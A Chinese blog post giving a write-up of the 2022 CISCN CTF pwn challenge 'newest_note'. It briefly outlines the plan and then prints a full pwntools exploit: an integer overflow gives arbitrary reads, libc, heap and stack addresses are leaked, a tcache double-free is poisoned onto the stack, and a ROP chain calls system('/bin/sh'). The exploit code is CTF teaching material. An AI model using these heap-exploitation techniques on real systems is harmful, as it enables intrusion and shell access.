---
layout : post
author : wsxk
comments : true
title : "2022ciscn newest_note wp"
date : 2022-6-12
tags : [ctf_wp]
---

国赛的题目

漏看了整数溢出导致题目不会做（😭）

总思路如下：

1. 利用整数溢出申请超大堆（超过32bits会被截断）从而实现任意地址读

2. 泄露libc、heap、stack基址

3. 劫持stack基址，进行ROP攻击。 

## exp

```py
from pwn import *
context.log_level='debug'
#io = process("./newest_note",env={"LD_PRELOAD":"/home/wsxk/Desktop/glibc/install/lib64/libc.so.6"})
io = process("./newest_note")
libc = ELF("./libc.so.6")
def add(index,content):
    io.sendlineafter(": ",str(1))
    io.sendlineafter("Index: ",str(index))
    io.sendlineafter("Content: ",content)

def delete(index):
    io.sendlineafter(": ",str(2))
    io.sendlineafter("Index: ",str(index))

def print_content(index):
    io.sendlineafter(": ",str(3))
    io.sendlineafter("Index: ",str(index))

#gdb.attach(io)
# leak libc
io.sendlineafter("How many pages your notebook will be? :",str(0x20005000))


print_content(0x4899a) 
#gdb.attach(io)
libc_base = u64(io.recvuntil(b"\x7f")[-6:].ljust(8,b"\x00"))-0x218cc0
log.success("libc_base:"+hex(libc_base))

#leak heap
print_content(0x48998) 
heap_base = u64((io.recv(15))[-6:].ljust(8,b"\x00"))-0x290
log.success("heap_base:"+hex(heap_base))

# gdb.attach(io)
# pause()
#leak stack_addr
print_content(0x487f5)
stack_addr = u64(io.recvuntil(b"\x7f")[-6:].ljust(8,b"\x00"))


for i in range(10):
    add(i,b"a"*0x30)

for i in range(7):
    delete(i)

delete(7)
delete(8)
delete(7)

for i in range(7):
    add(i,b"a"*0x30)

log.success("libc_base:"+hex(libc_base))
log.success("heap_base:"+hex(heap_base))
log.success("stack_addr:"+hex(stack_addr))


add(7,p64((stack_addr-0x150-0x8)^(heap_base>>12)))
add(0,b"wsxk")
add(1,b"wsxk")
gdb.attach(io)
pause()
libc.address = libc_base
add(2,p64(0)+p64(0x2d9b9+libc_base)+p64(libc_base+0x2e6c5)+p64(next(libc.search(b"/bin/sh\x00")))+p64(libc.sym["system"]))
# 进入system，有栈地址对齐的要求，因此多添加了一个ret。
# log.success("libc_base:"+hex(libc_base))
# log.success("heap_base:"+hex(heap_base))
# log.success("stack_addr:"+hex(stack_addr))

io.interactive()
```